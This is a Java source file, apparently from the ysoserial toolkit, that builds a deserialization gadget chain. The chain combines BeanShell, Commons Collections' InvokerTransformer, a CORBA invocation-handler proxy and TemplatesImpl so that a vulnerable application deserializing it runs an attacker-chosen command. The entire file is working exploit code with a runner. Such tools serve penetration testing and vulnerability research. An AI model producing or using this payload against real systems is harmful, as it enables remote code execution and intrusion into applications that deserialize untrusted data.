package ysoserial.payloads;

import java.io.Serializable;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import bsh.Interpreter;
import bsh.NameSpace;
import bsh.XThis;

import com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/**
 * @author Andrey B. Panfilov <andrey@panfilov.tel>
 */
@SuppressWarnings({ "rawtypes", "unchecked", "restriction" })
@Dependencies({ "org.beanshell:bsh:2.0b5", "commons-collections:commons-collections:3.1" })
public class BeanShellCommonsCollections extends PayloadRunner implements ObjectPayload<Map> {

	public Map getObject(String command) throws Exception {
		TemplatesImpl templates = Gadgets.createTemplatesImpl(command);
		Interpreter interpreter = new Interpreter();
		interpreter.eval("get(java.lang.Object a) {\n\tnew java.util.PriorityQueue(2,\n"
				+ "\t\t\tnew org.apache.commons.collections.comparators.TransformingComparator(\n"
				+ "\t\t\t\t\tnew org.apache.commons.collections.functors.InvokerTransformer(\"newTransformer\",\n"
				+ "\t\t\t\t\t\t\tnew java.lang.Class[0], new java.lang.Object[0]))).addAll(templates);\n}");
		XThis x = new XThis(interpreter.getNameSpace(), interpreter);
		NameSpace nameSpace = x.getNameSpace();
		List<TemplatesImpl> templateCollection = new ArrayList<TemplatesImpl>();
		templateCollection.add(templates);
		templateCollection.add(templates);
		nameSpace.setVariable("templates", templateCollection, false);
		Map proxy = (Map) x.getInterface(new Class[] { Map.class, });
		CompositeInvocationHandlerImpl handler = new CompositeInvocationHandlerImpl();
		handler.setDefaultHandler(new InvocationHandler() {
			public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
				return method.invoke(new HashMap(), args);
			}
		});
		Map<Object, Object> result = new HashMap<Object, Object>();
		result.put(Gadgets.createProxy(handler, Serializable.class), null);
		Reflections.setFieldValue(handler, "classToInvocationHandler", proxy);
		handler.setDefaultHandler(null);
		return result;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(BeanShellCommonsCollections.class, args);
	}

}
